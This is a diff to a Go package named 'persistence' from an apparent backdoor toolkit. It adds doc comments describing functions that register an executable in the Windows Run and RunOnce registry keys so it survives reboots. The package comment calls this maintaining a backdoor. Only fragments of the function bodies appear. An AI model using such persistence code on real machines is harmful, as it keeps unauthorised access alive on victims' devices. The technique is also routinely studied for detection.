@@ -1,3 +1,4 @@
+// Package for maintaining backdoor on device for long periods of time.
 package persistence
 
 import (
@@ -8,6 +9,9 @@ import (
 	"github.com/iIIusi0n/backkit/utils"
 )
 
+// Add executable file to startup using Run registry in HKCU.
+// AddStartupUsingHkcuRun(name, path) will add file in path to registry with key name.
+// You can ignore path like AddStartupUsingHkcuRun(name), then it will add current file to registry.
 func AddStartupUsingHkcuRun(args ...string) error {
 	switch len(args) {
 	case 1:
@@ -41,6 +45,10 @@ func addCurrentFileToStartupUsingHkcuRun(name string) error {
 	return addExternalFileToStartupUsingHkcuRun(name, currentPath)
 }
 
+// Add executable file to startup using RunOnce registry in HKCU.
+// AddStartupUsingHkcuRunOnce(name, path) will add file in path to registry with key name.
+// You can ignore path like AddStartupUsingHkcuRunOnce(name), then it will add current file to registry.
+// Value in RunOnce registry will be deleted after reboot.
 func AddStartupUsingHkcuRunOnce(args ...string) error {
 	switch len(args) {
 	case 1:
@@ -74,6 +82,10 @@ func addCurrentFileToStartupUsingHkcuRunOnce(name string) error {
 	return addExternalFileToStartupUsingHkcuRunOnce(name, currentPath)
 }
 
+// Add executable file to startup using Run registry in HKLM.
+// AddStartupUsingHkcuRun(name, path) will add file in path to registry with key name.
+// You can ignore path like AddStartupUsingHkcuRun(name), then it will add current file to registry.
+// This function required administrator privileges.
 func AddStartupUsingHklmRun(args ...string) error {
 	switch len(args) {
 	case 1:
@@ -107,6 +119,11 @@ func addCurrentFileToStartupUsingHklmRun(name string) error {
 	return addExternalFileToStartupUsingHklmRun(name, currentPath)
 }
 
+// Add executable file to startup using RunOnce registry in HKLM.
+// AddStartupUsingHkcuRunOnce(name, path) will add file in path to registry with key name.
+// You can ignore path like AddStartupUsingHkcuRunOnce(name), then it will add current file to registry.
+// Value in RunOnce registry will be deleted after reboot.
+// This function required administrator privileges.
 func AddStartupUsingHklmRunOnce(args ...string) error {
 	switch len(args) {
 	case 1:
